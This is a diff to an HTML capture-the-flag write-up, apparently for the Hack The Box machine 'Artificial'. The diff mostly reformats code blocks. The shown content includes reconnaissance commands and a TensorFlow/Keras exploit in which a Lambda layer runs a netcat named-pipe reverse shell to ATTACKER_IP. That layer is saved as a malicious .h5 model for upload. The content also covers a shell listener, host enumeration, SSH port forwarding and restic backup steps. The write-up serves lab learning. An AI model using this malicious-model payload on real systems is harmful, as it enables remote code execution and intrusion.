@@ -52,7 +52,7 @@
             <h2>Reconnaissance</h2>
             <p>Commands used to discover potential attack vectors:</p>
             <pre>
-<code># Nmap scan
+<code class="language-bash"># Nmap scan
 nmap -sC -sV 10.10.11.74
 # Adding to /etc/hosts
 echo 10.10.11.74 artificial.htb | sudo tee -a /etc/hosts</code></pre>
@@ -70,13 +70,16 @@ echo 10.10.11.74 artificial.htb | sudo tee -a /etc/hosts</code></pre>
             <h2>Foothold</h2>
             <p>Gaining initial access. Below are the exact commands, and payloads:</p>
             <pre>
-<code># Crafting a malicious model to upload
-vim exploit.py
+<code class="language-bash"># Create the payload file
+vim exploit.py</code></pre>
 
-#import tensorflow as tf
+            <pre>
+<code class="language-python"># exploit.py
+import tensorflow as tf
+
 def exploit(x):
     import os
-         os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f")
+    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f")
     return x
 
 model = tf.keras.Sequential()
@@ -85,17 +88,19 @@ model.add(tf.keras.layers.Lambda(exploit))
 model.compile()
 model.save("exploit.h5")
 
-# Save file and exit vim
+# Save and exit vim</code></pre>
 
-# Have to replicate target environment with the required tensorflow version and dockerfile
-sudo docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 exploit.py  
+            <pre>
+<code class="language-bash"># Crafting and running the malicious model
+# Replicate target environment with the required TensorFlow version
+sudo docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 exploit.py
 
 # Upload malicious .h5 file to the web app, then "view predictions" to trigger the payload
 
-# Setting up a netcat listener in a new terminal to catch the reverse shell
+# Catch reverse shell
 nc -lvnp 4444
 
-# Making the shell a little easier to understand
+# Make shell easier to use
 script -qc /bin/bash /dev/null</code></pre>
 
             <img src="/images/artificial-images/artificial_compile.png" class="article-image-img">
@@ -110,7 +115,7 @@ script -qc /bin/bash /dev/null</code></pre>
             <h2>Exploitation Pt 1</h2>
             <p>Actions taken after gaining a shell to enumerate the host:</p>
             <pre>
-<code>whoami
+<code class="language-bash">whoami
 pwd
 uname -a
 cd /var/log/ #checking logs for clues
@@ -161,7 +166,7 @@ ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898 # Setting up port forwarding to acce
             <h2>Exploitation Pt 2</h2>
             <p>Retrieving root flag. Below are notes and commands used:</p>
             <pre>
-<code># Here we set up the restic backup server locally to retrieve the backup file
+<code class="language-bash"># Here we set up the restic backup server locally to retrieve the backup file
 wget https://github.com/restic/rest-server/releases/download/v0.12.1/rest-server_0.12.1_linux_amd64.tar.gz
 tar -xvzf rest-server_0.12.1_linux_amd64.tar.gz 
 cd rest-server_0.12.1_linux_amd64
